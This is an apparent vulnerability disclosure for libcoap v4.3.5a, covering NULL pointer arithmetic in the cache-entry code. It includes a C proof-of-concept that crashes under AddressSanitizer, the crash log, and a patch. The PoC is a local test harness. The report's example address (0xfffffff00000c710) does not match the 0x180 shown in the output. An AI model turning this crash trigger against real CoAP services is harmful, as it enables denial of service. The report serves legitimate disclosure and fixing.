## Vulnerability Report

| Field | Detail |
|-------|--------|
| **Type** | CWE-682: Incorrect Calculation / CWE-476: NULL Pointer Dereference |
| **Severity** | **Medium** — Undefined Behavior, potential memory corruption and crash |
| **Affected Version** | libcoap v4.3.5a |
| **Root Cause** | NULL pointer arithmetic in `coap_new_cache_entry_lkd()` (`src/coap_cache.c:206`) |

---

## Impact

When a CoAP PDU without payload (`pdu->data == NULL`) is passed to `coap_new_cache_entry()` with `COAP_CACHE_RECORD_PDU`, the function performs pointer arithmetic on a NULL pointer, resulting in **undefined behavior** per the C standard (§6.5.6). The computed pointer overflows to an invalid address (e.g., `0xfffffff00000c710`), which is stored in the cache entry's `pdu->data` field.

- **Memory Corruption**: In production builds, subsequent code that dereferences this pointer (e.g., `coap_cache_get_pdu()` → read payload from cache) will access an arbitrary memory address
- **Denial of Service**: The invalid pointer dereference causes a segfault

---

## Description

In `coap_new_cache_entry_lkd()` at `src/coap_cache.c:194-207`, when copying a PDU into a cache entry with `COAP_CACHE_RECORD_PDU`, the function unconditionally computes a pointer offset without checking for NULL:

```c
// src/coap_cache.c:194-207 (v4.3.5a)
if (record_pdu == COAP_CACHE_RECORD_PDU) {
    entry->pdu = coap_pdu_init(pdu->type, pdu->code, pdu->mid, pdu->alloc_size);
    if (entry->pdu) {
        if (!coap_pdu_resize(entry->pdu, pdu->alloc_size)) {
            coap_delete_pdu(entry->pdu);
            coap_free_type(COAP_CACHE_ENTRY, entry);
            return NULL;
        }
        /* Need to get the appropriate data across */
        memcpy(entry->pdu, pdu, offsetof(coap_pdu_t, token));
        memcpy(entry->pdu->token, pdu->token, pdu->used_size);
        /* And adjust all the pointers etc. */
        entry->pdu->data = entry->pdu->token + (pdu->data - pdu->token);  // ← BUG
    }
}
```

When `pdu->data == NULL`:
1. `pdu->data - pdu->token` computes `NULL - (non-NULL pointer)` → **undefined behavior**
2. The result overflows to a garbage value (e.g., `0xfffffff00000c710`)
3. This invalid pointer is assigned to `entry->pdu->data`, creating a dangling pointer

```
Attacker → CoAP Request (no payload, pdu->data == NULL)
              │
              ▼
    coap_new_cache_entry(session, pdu, COAP_CACHE_RECORD_PDU, ...)
              │
              ▼
    entry->pdu->data = entry->pdu->token + (pdu->data - pdu->token)
                                            ^^^^^^^^^^^^^^^^^^^^^^^^
                                            NULL - non-NULL = 💥 UB
              │
              ▼
    entry->pdu->data = 0xfffffff00000c710   ← invalid pointer stored
```

---

## POC

```c
/*
 * Minimal PoC: Trigger NULL pointer arithmetic in coap_new_cache_entry_lkd()
 * Compile: clang-18 -g -fsanitize=address,undefined -I include -I src -I . \
 *          poc_cache_null.c .libs/libcoap-3-notls.a -o poc_cache_null
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "coap3/coap_libcoap_build.h"

int main(void) {
    coap_startup();
    coap_context_t *ctx = coap_new_context(NULL);
    if (!ctx) { fprintf(stderr, "Failed to create context\n"); return 1; }

    /* Create a UDP endpoint */
    coap_address_t addr;
    coap_address_init(&addr);
    addr.addr.sin.sin_family = AF_INET;
    addr.addr.sin.sin_port = htons(15683);
    addr.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    coap_endpoint_t *ep = coap_new_endpoint(ctx, &addr, COAP_PROTO_UDP);
    if (!ep) { fprintf(stderr, "Failed to create endpoint\n"); return 1; }

    /* Create a PDU WITHOUT payload (pdu->data will be NULL) */
    coap_pdu_t *pdu = coap_pdu_init(COAP_MESSAGE_CON, COAP_REQUEST_CODE_GET,
                                     0x1234, 256);
    if (!pdu) { fprintf(stderr, "Failed to create PDU\n"); return 1; }

    /* Add token only, no payload → pdu->data remains NULL */
    uint8_t token[] = {0xAA, 0xBB};
    coap_add_token(pdu, sizeof(token), token);

    /* Add some options */
    uint8_t uri[] = "test";
    coap_add_option(pdu, COAP_OPTION_URI_PATH, sizeof(uri) - 1, uri);

    printf("[*] pdu->data = %p (should be NULL)\n", (void *)pdu->data);

    /* Create a fake session for cache entry creation */
    coap_session_t *session = coap_new_client_session(ctx, NULL, &addr, COAP_PROTO_UDP);

    /* THIS TRIGGERS THE BUG: COAP_CACHE_RECORD_PDU with pdu->data == NULL */
    printf("[*] Calling coap_new_cache_entry() with COAP_CACHE_RECORD_PDU...\n");
    coap_cache_entry_t *entry = coap_new_cache_entry(session, pdu,
                                                      COAP_CACHE_RECORD_PDU,
                                                      COAP_CACHE_NOT_SESSION_BASED, 0);

    if (entry) {
        const coap_pdu_t *cached = coap_cache_get_pdu(entry);
        printf("[!] cached pdu->data = %p (INVALID — should be NULL)\n",
               (void *)cached->data);

        /*
         * The invalid pointer (0x180) is now stored in the cache entry.
         * Any code that tries to read payload from the cached PDU will
         * dereference this invalid address and crash.
         *
         * In a real application, this happens when the server retrieves
         * a cached response and tries to read its payload, e.g. via
         * coap_get_data() or direct access to cached->data.
         */
        printf("[*] Dereferencing invalid cached->data pointer to trigger crash...\n");
        size_t payload_len = cached->used_size - (cached->data - cached->token);
        printf("[!] Reading %zu bytes from invalid address %p...\n",
               payload_len, (void *)cached->data);
        /* This WILL crash — reading from address 0x180 (unmapped memory) */
        volatile uint8_t byte = cached->data[0];
        (void)byte;
        printf("[?] Should not reach here\n");
    }

    coap_delete_pdu(pdu);
    coap_free_context(ctx);
    coap_cleanup();
    return 0;
}
```

---

## Output:

```
❯ ./poc_cache_null
[*] pdu->data = (nil) (should be NULL)
[*] Calling coap_new_cache_entry() with COAP_CACHE_RECORD_PDU...
[!] cached pdu->data = 0x180 (INVALID — should be NULL)
[*] Dereferencing invalid cached->data pointer to trigger crash...
[!] Reading 89197880803405 bytes from invalid address 0x180...
AddressSanitizer:DEADLYSIGNAL
=================================================================
==308582==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000180 (pc 0x5aeb58426dab bp 0x7ffd02851fe0 sp 0x7ffd02851f20 T0)
==308582==The signal is caused by a READ memory access.
==308582==Hint: address points to the zero page.
    #0 0x5aeb58426dab in main /home/eur1ka/CoAPLab3/libcoap/poc_cache_null.c:63:33
    #1 0x7ea62aa29d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #2 0x7ea62aa29e3f in __libc_start_main csu/../csu/libc-start.c:392:3
    #3 0x5aeb5834f4e4 in _start (/home/eur1ka/CoAPLab3/libcoap/poc_cache_null+0x13b4e4) (BuildId: 19b5a732b865a35f504a4d3792ed8c645b256ee6)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/eur1ka/CoAPLab3/libcoap/poc_cache_null.c:63:33 in main
==308582==ABORTING
```

---


## Suggested Fix

Add a NULL check before the pointer arithmetic:

```diff
--- a/src/coap_cache.c
+++ b/src/coap_cache.c
@@ -203,7 +203,11 @@
       memcpy(entry->pdu, pdu, offsetof(coap_pdu_t, token));
       memcpy(entry->pdu->token, pdu->token, pdu->used_size);
       /* And adjust all the pointers etc. */
-      entry->pdu->data = entry->pdu->token + (pdu->data - pdu->token);
+      if (pdu->data) {
+        entry->pdu->data = entry->pdu->token + (pdu->data - pdu->token);
+      } else {
+        entry->pdu->data = NULL;
+      }
     }
 }
```
